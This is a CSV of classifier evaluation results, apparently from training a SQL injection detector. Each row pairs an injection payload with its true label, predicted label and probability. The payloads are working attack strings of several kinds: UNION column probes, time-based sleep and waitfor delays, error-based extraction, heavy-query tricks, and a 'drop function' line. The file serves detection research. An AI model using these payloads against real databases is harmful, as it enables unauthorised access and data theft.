text,source,fuzzy_cluster_id,true_label,pred_label,prob_sqli,correct
1   )    )    as sfan where 7176  =  7176 and 7017  =  7358,sajid576/sql-injection-dataset,526,1,1,0.9999865293502808,1
1'||  (  select 'noik' from dual where 9851  =  9851,sajid576/sql-injection-dataset,538,1,1,0.9999864101409912,1
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,sajid576/sql-injection-dataset,544,1,1,0.9999865293502808,1
"1'  )   where 3262  =  3262 union all select null,null,null,null,null,null,null,null,null,null#",sajid576/sql-injection-dataset,553,1,1,0.9999862909317017,1
"1""   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""dtfg""  =  ""dtfg",sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,sajid576/sql-injection-dataset,544,1,1,0.9999865293502808,1
"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",sajid576/sql-injection-dataset,359,1,1,0.9999865293502808,1
1  )   where 2232  =  2232,sajid576/sql-injection-dataset,563,1,1,0.9999862909317017,1
"1'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'xtdj'  =  'xtdj",sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
1'||  (  select 'tvcy' where 5592  =  5592 order by 1#,sajid576/sql-injection-dataset,570,1,1,0.9999864101409912,1
"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",sajid576/sql-injection-dataset,573,1,1,0.9999862909317017,1
1'  )   where 7908  =  7908 or sleep  (  5  )  --,sajid576/sql-injection-dataset,587,1,1,0.9999865293502808,1
"1""   )    )    and 2006  =  2006",sajid576/sql-injection-dataset,598,1,1,0.9999862909317017,1
1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,sajid576/sql-injection-dataset,276,1,1,0.9999865293502808,1
1'  )   as lewd where 3118  =  3118 order by 1--,sajid576/sql-injection-dataset,601,1,1,0.9999862909317017,1
"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",sajid576/sql-injection-dataset,276,1,1,0.9999865293502808,1
"1'  )   as eymt where 3911  =  3911 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sajid576/sql-injection-dataset,618,1,1,0.9999862909317017,1
1'+  (  select 'hcqf' where 9956  =  9956 and   (  2993  =  4297  )  *4297  )  +',sajid576/sql-injection-dataset,628,1,1,0.9999864101409912,1
select   (  case when   (  3863  =  1151  )   then 3863 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,sajid576/sql-injection-dataset,638,1,1,0.9999865293502808,1
"1""   )    )    and make_set  (  1167  =  5027,5027  )   and    (    (   ""grfi""  =  ""grfi",sajid576/sql-injection-dataset,643,1,1,0.9999864101409912,1
1'+  (  select qdon where 9453  =  9453,sajid576/sql-injection-dataset,650,1,1,0.9999861717224121,1
1  )   as zzip where 5353  =  5353 and 3394  =  3092,sajid576/sql-injection-dataset,662,1,1,0.9999862909317017,1
"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )",sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
select   (  case when   (  1499  =  4923  )   then 1499 else 1/  (  select 0  )   end  )  --,sajid576/sql-injection-dataset,673,1,1,0.9999865293502808,1
"1""  )   where 9447  =  9447",sajid576/sql-injection-dataset,685,1,1,0.9999865293502808,1
"1""   )    )    as ljhz where 2416  =  2416",sajid576/sql-injection-dataset,696,1,1,0.9999864101409912,1
-5962   )    )    as jbqv where 2583  =  2583 or 7496  =  8560--,sajid576/sql-injection-dataset,707,1,1,0.9999865293502808,1
"end and ""xouo"" like ""xouo",sajid576/sql-injection-dataset,719,1,1,0.9999847412109375,1
"-5726%""   )    )    or 6872  =  6872 and    (    (   ""%""  =  """,sajid576/sql-injection-dataset,729,1,1,0.9999864101409912,1
1 and   (  3020  =  3020  )  *6703# syuj,sajid576/sql-injection-dataset,741,1,1,0.9999864101409912,1
"select * from generate_series  (  4465,4465,case when   (  4465  =  6232  )   then 1 else 0 end  )   limit 1--",sajid576/sql-injection-dataset,747,1,1,0.9999861717224121,1
waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,sajid576/sql-injection-dataset,752,1,1,0.9999854564666748,1
"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'xwsb'  =  'xwsb",sajid576/sql-injection-dataset,767,1,1,0.9999865293502808,1
1' where 9602  =  9602,sajid576/sql-injection-dataset,781,1,1,0.9999860525131226,1
1'||  (  select 'jlon' where 1461  =  1461,sajid576/sql-injection-dataset,791,1,1,0.9999862909317017,1
"-1277""  )   where 6622  =  6622 or 3038  =  3038",sajid576/sql-injection-dataset,804,1,1,0.9999865293502808,1
"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",sajid576/sql-injection-dataset,812,1,1,0.9999865293502808,1
"1'  )   where 1027  =  1027 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",sajid576/sql-injection-dataset,336,1,1,0.9999865293502808,1
"1%""   )    )    and make_set  (  9897  =  5557,5557  )   and    (    (   ""%""  =  """,sajid576/sql-injection-dataset,816,1,1,0.9999864101409912,1
"1%'  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",sajid576/sql-injection-dataset,828,1,1,0.9999865293502808,1
select   (  case when   (  4572  =  4086  )   then 1 else 4572*  (  select 4572 from master..sysdatabases  )   end  )  --,sajid576/sql-injection-dataset,842,1,1,0.9999866485595703,1
"1'  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,854,1,1,0.9999861717224121,1
"1'||  (  select 'mwmn' where 5112  =  5112 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",sajid576/sql-injection-dataset,336,1,1,0.9999865293502808,1
"1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--",sajid576/sql-injection-dataset,867,1,1,0.9999864101409912,1
"1'+  (  select 'gqsk' where 3087  =  3087 union all select null,null,null,null--",sajid576/sql-injection-dataset,868,1,1,0.9999864101409912,1
1'   )    )    as plgq where 1121  =  1121,sajid576/sql-injection-dataset,879,1,1,0.9999862909317017,1
"-5026' where 7324  =  7324 union all select 7324,7324--",sajid576/sql-injection-dataset,884,1,1,0.9999862909317017,1
-2569' union all select 4484--,sajid576/sql-injection-dataset,906,1,1,0.9999856948852539,1
"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",sajid576/sql-injection-dataset,917,1,1,0.9999866485595703,1
"-1558 or elt  (  3306  =  2272,2272  )  -- ioxt",sajid576/sql-injection-dataset,921,1,1,0.9999862909317017,1
"1   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   5349  =  5349",sajid576/sql-injection-dataset,336,1,1,0.9999862909317017,1
1'   )    )    as xqvq where 4816  =  4816 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,sajid576/sql-injection-dataset,934,1,1,0.9999866485595703,1
"1'+  (  select 'igoi' where 7823  =  7823 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",sajid576/sql-injection-dataset,941,1,1,0.9999865293502808,1
1'  )   and   (  1471  =  7892  )  *7892 and   (  'kkok' like 'kkok,sajid576/sql-injection-dataset,948,1,1,0.9999866485595703,1
"1',  (  select   (  case when   (  1392  =  1380  )   then 1 else 1392*  (  select 1392 from master..sysdatabases  )   end   )    )",sajid576/sql-injection-dataset,961,1,1,0.9999865293502808,1
"1%""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,854,1,1,0.9999861717224121,1
1'||  (  select 'vxfx' where 7038  =  7038 and 9306  =  4187  )  ||',sajid576/sql-injection-dataset,979,1,1,0.9999866485595703,1
"1  )   as iupg where 2861  =  2861 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sajid576/sql-injection-dataset,980,1,1,0.9999862909317017,1
1'||  (  select 'etvo' from dual where 1557  =  1557,sajid576/sql-injection-dataset,990,1,1,0.9999861717224121,1
"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",sajid576/sql-injection-dataset,996,1,1,0.9999865293502808,1
"1  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )",sajid576/sql-injection-dataset,336,1,1,0.9999862909317017,1
"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",sajid576/sql-injection-dataset,359,1,1,0.9999865293502808,1
"1""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""imlx""  =  ""imlx",sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
"1'||  (  select 'rask' from dual where 9411  =  9411 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||'",sajid576/sql-injection-dataset,1015,1,1,0.9999862909317017,1
1'+  (  select 'lpkv' where 8760  =  8760,sajid576/sql-injection-dataset,1024,1,1,0.9999862909317017,1
"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,sajid576/sql-injection-dataset,1035,1,1,0.9999865293502808,1
"1%""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,sajid576/sql-injection-dataset,336,1,1,0.9999864101409912,1
"1'||  (  select 'cqjw' from dual where 7335  =  7335 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",sajid576/sql-injection-dataset,1049,1,1,0.9999864101409912,1
"-3862   )    )    as vqtl where 9629  =  9629 union all select 9629,9629,9629,9629,9629--",sajid576/sql-injection-dataset,1051,1,1,0.9999864101409912,1
select   (  case when   (  9667  =  6212  )   then 9667 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,sajid576/sql-injection-dataset,1063,1,1,0.9999865293502808,1
"-5622"" where 7970  =  7970 union all select 7970,7970,7970,7970,7970--",sajid576/sql-injection-dataset,1073,1,1,0.9999864101409912,1
1'||  (  select 'cfff' where 4994  =  4994,sajid576/sql-injection-dataset,1085,1,1,0.9999862909317017,1
if  (  1087  =  5839  )   select 1087 else drop function zzeh--,sajid576/sql-injection-dataset,1096,1,1,0.9999864101409912,1
"1""  )   as kndn where 9314  =  9314",sajid576/sql-injection-dataset,1106,1,1,0.9999864101409912,1
"-5572""  )   union all select 8131,8131#",sajid576/sql-injection-dataset,1118,1,1,0.9999860525131226,1
1'  )   as mqxb where 6496  =  6496 and 7533  =  7533--,sajid576/sql-injection-dataset,1129,1,1,0.9999866485595703,1
"1'+  (  select luwn where 1214  =  1214 union all select null,null,null,null,null,null#",sajid576/sql-injection-dataset,1139,1,1,0.9999864101409912,1
1%'   )    )     )   and 2006  =  2006,sajid576/sql-injection-dataset,598,1,1,0.9999861717224121,1
"1""   )    )    as uzvu where 2458  =  2458 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",sajid576/sql-injection-dataset,336,1,1,0.9999865293502808,1
1'+  (  select 'yjpp' where 8966  =  8966,sajid576/sql-injection-dataset,1146,1,1,0.9999860525131226,1
"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz",sajid576/sql-injection-dataset,359,1,1,0.9999864101409912,1
-4191  )   order by 1#,sajid576/sql-injection-dataset,1160,1,1,0.9999858140945435,1
"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",sajid576/sql-injection-dataset,1162,1,1,0.9999864101409912,1
"-9140""   )    )    union all select 1623,1623,1623,1623,1623,1623,1623,1623,1623#",sajid576/sql-injection-dataset,1174,1,1,0.9999864101409912,1
"1'   )    )    as mdtm where 1393  =  1393 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sajid576/sql-injection-dataset,1180,1,1,0.9999864101409912,1
-6218'   )    )    or 2236  =  4469#,sajid576/sql-injection-dataset,1194,1,1,0.9999861717224121,1
"-8043%""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""%""  =  """,sajid576/sql-injection-dataset,1201,1,1,0.9999865293502808,1
"1'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'dsok'  =  'dsok",sajid576/sql-injection-dataset,336,1,1,0.9999865293502808,1
"1'  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'ozef'  =  'ozef",sajid576/sql-injection-dataset,379,1,1,0.9999862909317017,1
"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--",sajid576/sql-injection-dataset,1217,1,1,0.9999842643737793,1
"1""  )   as zopq where 2680  =  2680",sajid576/sql-injection-dataset,1230,1,1,0.9999864101409912,1
"-6803""  )   order by 1#",sajid576/sql-injection-dataset,1234,1,1,0.999985933303833,1
"1""  )   where 2602  =  2602 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sajid576/sql-injection-dataset,1242,1,1,0.9999865293502808,1
"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",sajid576/sql-injection-dataset,1256,1,1,0.9999865293502808,1
1  )   where 8320  =  8320 waitfor delay '0:0:5'--,sajid576/sql-injection-dataset,1269,1,1,0.9999865293502808,1
1'||  (  select 'hbho' from dual where 7193  =  7193,sajid576/sql-injection-dataset,1280,1,1,0.9999862909317017,1
"1'  )   where 7646  =  7646 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sajid576/sql-injection-dataset,1291,1,1,0.9999864101409912,1
"-6389"" union all select 2355,2355,2355,2355,2355--",sajid576/sql-injection-dataset,1292,1,1,0.9999856948852539,1
"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",sajid576/sql-injection-dataset,1298,1,1,0.9999840259552002,1
"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sajid576/sql-injection-dataset,379,1,1,0.9999861717224121,1
"1'||  (  select 'qwoo' from dual where 8802  =  8802 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",sajid576/sql-injection-dataset,1315,1,1,0.9999864101409912,1
select   (  case when   (  5198  =  2518  )   then 5198 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,sajid576/sql-injection-dataset,1327,1,1,0.9999865293502808,1
1'   )    )    as pqbq where 1865  =  1865,sajid576/sql-injection-dataset,1332,1,1,0.9999862909317017,1
"1""  )   as hblk where 7982  =  7982 and 9611  =  6142--",sajid576/sql-injection-dataset,1350,1,1,0.9999865293502808,1
"1%'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",sajid576/sql-injection-dataset,379,1,1,0.9999862909317017,1
"-1305  )   or make_set  (  2298  =  5545,5545  )   and   (  6715  =  6715",sajid576/sql-injection-dataset,1361,1,1,0.9999864101409912,1
select   (  case when   (  9299  =  2760  )   then 1 else 9299*  (  select 9299 from master..sysdatabases  )   end  )  --,sajid576/sql-injection-dataset,1363,1,1,0.9999865293502808,1
